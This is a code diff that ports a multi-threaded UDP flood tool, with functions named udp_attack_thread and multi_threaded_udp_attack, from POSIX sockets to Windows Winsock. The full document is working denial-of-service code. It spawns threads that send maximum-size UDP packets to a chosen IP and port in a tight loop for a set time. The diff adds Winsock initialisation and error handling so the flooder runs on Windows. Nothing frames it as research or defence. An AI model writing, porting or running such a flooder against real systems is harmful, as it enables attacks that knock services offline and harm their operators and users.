@@ -1,15 +1,14 @@
 #include <iostream>
+#include <thread>
+#include <vector>
+#include <mutex>
 #include <cstring>
 #include <cstdlib>
 #include <ctime>
-#include <netinet/in.h>
-#include <arpa/inet.h>
-#include <unistd.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <vector>
-#include <thread>
-#include <mutex>
+#include <winsock2.h> // Windows-specific networking
+#include <ws2tcpip.h> // For inet_pton and other utilities
+
+#pragma comment(lib, "Ws2_32.lib") // Link with Ws2_32.lib
 
 // Constants
 #define PACKET_SIZE 65507  // Maximum UDP payload size (65507 bytes)
@@ -50,11 +49,11 @@ void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id)
     sockaddr_in server_addr{};
     char buffer[PAYLOAD_SIZE];
 
-    // Create a UDP socket
-    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    if (sock < 0) {
+    // Initialize the socket
+    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    if (sock == INVALID_SOCKET) {
         std::lock_guard<std::mutex> lock(log_mutex);
-        std::cerr << "Thread " << thread_id << " - Error: Unable to create socket. " << strerror(errno) << std::endl;
+        std::cerr << "Thread " << thread_id << " - Error: Unable to create socket. " << WSAGetLastError() << std::endl;
         return;
     }
 
@@ -63,7 +62,7 @@ void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id)
     if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
         std::lock_guard<std::mutex> lock(log_mutex);
         std::cerr << "Thread " << thread_id << " - Error: Invalid IP address - " << ip << std::endl;
-        close(sock);
+        closesocket(sock);
         return;
     }
 
@@ -71,14 +70,14 @@ void udp_attack_thread(const char *ip, int port, int attack_time, int thread_id)
 
     time_t start_time = time(nullptr);
     while (time(nullptr) - start_time < attack_time) {
-        ssize_t sent = sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
-        if (sent < 0) {
+        int sent = sendto(sock, buffer, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
+        if (sent == SOCKET_ERROR) {
             std::lock_guard<std::mutex> lock(log_mutex);
-            std::cerr << "Thread " << thread_id << " - Error: Failed to send packet. " << strerror(errno) << std::endl;
+            std::cerr << "Thread " << thread_id << " - Error: Failed to send packet. " << WSAGetLastError() << std::endl;
         }
     }
 
-    close(sock);
+    closesocket(sock);
     std::lock_guard<std::mutex> lock(log_mutex);
     std::cout << "Thread " << thread_id << " completed its attack." << std::endl;
 }
@@ -126,7 +125,17 @@ int main(int argc, char *argv[]) {
         return EXIT_FAILURE;
     }
 
+    // Initialize Winsock
+    WSADATA wsa_data;
+    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
+        std::cerr << "Error: Failed to initialize Winsock. " << WSAGetLastError() << std::endl;
+        return EXIT_FAILURE;
+    }
+
     multi_threaded_udp_attack(ip, port, duration, thread_count);
+
+    // Cleanup Winsock
+    WSACleanup();
 
     return EXIT_SUCCESS;
 }
